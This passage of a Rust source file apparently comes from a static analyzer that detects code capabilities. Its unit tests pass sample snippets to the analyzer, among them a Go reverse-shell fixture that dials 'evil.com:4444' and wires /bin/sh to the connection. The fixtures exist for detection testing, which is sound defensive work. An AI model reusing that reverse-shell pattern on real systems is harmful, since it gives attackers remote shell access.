                    strs.concat_operations + strs.char_construction + strs.array_join_construction;
                text.dynamic_string_ratio = dynamic as f32 / strs.total as f32;
            }
        }

        if let Some(cmts) = comments {
            if cmts.total > 0 {
                let suspicious = cmts.high_entropy_comments + cmts.base64_in_comments;
                text.suspicious_comment_ratio = suspicious as f32 / cmts.total as f32;
            }
        }

        if let Some(imps) = imports {
            if imps.total > 0 {
                let dynamic = imps.dynamic_imports + imps.conditional_imports;
                text.dynamic_import_ratio = dynamic as f32 / imps.total as f32;
            }
        }

        if let Some(funcs) = functions {
            if funcs.total > 0 {
                text.anonymous_function_ratio = funcs.anonymous as f32 / funcs.total as f32;
            }
        }
    }
}

impl Analyzer for UnifiedSourceAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        // Read file and detect UTF-16 encoding
        let mut bytes = fs::read(file_path).context("Failed to read file")?;
        let original_bytes = bytes.clone(); // Keep original for stng

        // Check for UTF-16 LE BOM (FF FE) and convert to UTF-8
        if bytes.len() >= 2 && bytes[0] == 0xFF && bytes[1] == 0xFE {
            use encoding_rs::UTF_16LE;
            let (decoded, _, _) = UTF_16LE.decode(&bytes[2..]); // Skip BOM
            bytes = decoded.into_owned().into_bytes();
        }
        // Check for UTF-16 BE BOM (FE FF) and convert to UTF-8
        else if bytes.len() >= 2 && bytes[0] == 0xFE && bytes[1] == 0xFF {
            use encoding_rs::UTF_16BE;
            let (decoded, _, _) = UTF_16BE.decode(&bytes[2..]); // Skip BOM
            bytes = decoded.into_owned().into_bytes();
        }

        let content = String::from_utf8_lossy(&bytes);
        self.analyze_source_with_original(file_path, &content, &original_bytes)
    }

    fn can_analyze(&self, _file_path: &Path) -> bool {
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzers::FileType;
    use std::path::PathBuf;

    #[test]
    fn test_python_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python).unwrap();
        let path = PathBuf::from("test.py");
        let code = r#"
import os

def main():
    os.system("echo hello")
    print("world")

if __name__ == "__main__":
    main()
"#;
        let report = analyzer.analyze_source(&path, code).unwrap();
        assert!(report.structure.iter().any(|s| s.id.contains("python")));
        assert!(!report.functions.is_empty());
        assert!(!report.strings.is_empty());
    }

    #[test]
    fn test_javascript_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("test.js");
        let code = r#"
const http = require('http');

function fetchData(url) {
    return http.get(url);
}

const handler = async () => {
    await fetchData("http://example.com");
};
"#;
        let report = analyzer.analyze_source(&path, code).unwrap();
        assert!(report.structure.iter().any(|s| s.id.contains("javascript")));
        assert!(!report.functions.is_empty());
    }

    #[test]
    fn test_go_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go).unwrap();
        let path = PathBuf::from("test.go");
        let code = r#"
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
"#;
        let report = analyzer.analyze_source(&path, code).unwrap();
        assert!(report.structure.iter().any(|s| s.id.contains("go")));
        assert!(!report.functions.is_empty());
    }

    #[test]
    fn test_all_languages_have_configs() {
        // Ensure all source code file types have configurations
        let types = vec![
            FileType::Python,
            FileType::JavaScript,
            FileType::TypeScript,
            FileType::Go,
            FileType::Rust,
            FileType::Ruby,
            FileType::Php,
            FileType::Shell,
            FileType::Lua,
            FileType::Perl,
            FileType::PowerShell,
            FileType::Java,
            FileType::CSharp,
            FileType::C,
            FileType::Swift,
            FileType::ObjectiveC,
            FileType::Groovy,
            FileType::Scala,
            FileType::Zig,
            FileType::Elixir,
        ];

        for ft in types {
            assert!(
                config_for_file_type(&ft).is_some(),
                "Missing config for {:?}",
                ft
            );
        }
    }

    // Go-specific capability detection tests
    // These verify the unified analyzer correctly detects Go capabilities via the trait system

    fn analyze_go_code(code: &str) -> crate::types::AnalysisReport {
        let mapper = crate::capabilities::CapabilityMapper::new_without_validation();
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go)
            .unwrap()
            .with_capability_mapper(mapper);
        let path = PathBuf::from("test.go");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_detect_exec_command() {
        let code = r#"
package main
import "os/exec"
func main() {
    cmd := exec.Command("ls", "-la")
    cmd.Run()
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_syscall_exec() {
        let code = r#"
package main
import "syscall"
func main() {
    syscall.Exec("/bin/sh", []string{}, nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::syscall-exec"),
            "Expected micro-behaviors/process/create/direct::syscall-exec, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_reverse_shell() {
        let code = r#"
package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "evil.com:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
            "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_net_listen() {
        let code = r#"
package main
import "net"
func main() {
    ln, _ := net.Listen("tcp", ":8080")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/listen::listen-go"),
            "Expected micro-behaviors/communications/socket/listen::listen-go, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_net_dial() {
        let code = r#"
package main
import "net"
func main() {
    conn, _ := net.Dial("tcp", "example.com:80")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
            "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_http_get() {
        let code = r#"
package main
import "net/http"
func main() {
    resp, _ := http.Get("https://example.com")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
            "Expected micro-behaviors/communications/http/get::http-get, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_http_server() {
        let code = r#"
package main
import "net/http"
func main() {
    http.ListenAndServe(":8080", nil)
}
"#;
        let report = analyze_go_code(code);
        // The listenandserve-call trait matches the ListenAndServe call,
        // and go-http-server is a composite that includes listenandserve-call
        assert!(
            report.findings.iter().any(|c| c.id
                == "micro-behaviors/communications/http/server::go-http-server"
                || c.id == "micro-behaviors/communications/http/server::listenandserve-call"),
            "Expected go-http-server or listenandserve-call, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_aes_encryption() {
        let code = r#"
package main
import "crypto/aes"
func main() {
    key := []byte("secret")
    block, _ := aes.NewCipher(key)
    _ = block
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/crypto/cipher/library::aes-new-cipher"),
            "Expected micro-behaviors/crypto/cipher/library::aes-new-cipher, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_rsa_encryption() {
        let code = r#"
package main
import "crypto/rsa"
func main() {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/crypto/cipher/library::rsa-generate-key"),
            "Expected micro-behaviors/crypto/cipher/library::rsa-generate-key, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_file_write() {
        let code = r#"
package main
import "os"
func main() {
    f, _ := os.Create("test.txt")
    f.WriteString("data")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/fs/file/operations::os-create"),
            "Expected micro-behaviors/fs/file/operations::os-create, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_go_structural_feature() {
        let code = "package main\nfunc main() {}";
        let report = analyze_go_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/go"));
    }

    #[test]
    fn test_go_extract_functions() {
        let code = r#"
package main

func hello() string {
    return "world"
}

func main() {
    hello()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.functions.len() >= 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "main"));
    }

    #[test]
    fn test_go_multiple_capabilities() {
        let code = r#"
package main
import ("os/exec"; "net/http"; "os")

func main() {
    exec.Command("whoami").Run()
    http.Get("https://evil.com")
    os.Remove("/tmp/file")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.len() >= 2,
            "Expected >= 2 findings, found: {}",
            report.findings.len()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command"
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
            "Expected micro-behaviors/communications/http/get::http-get"
        );
    }
}
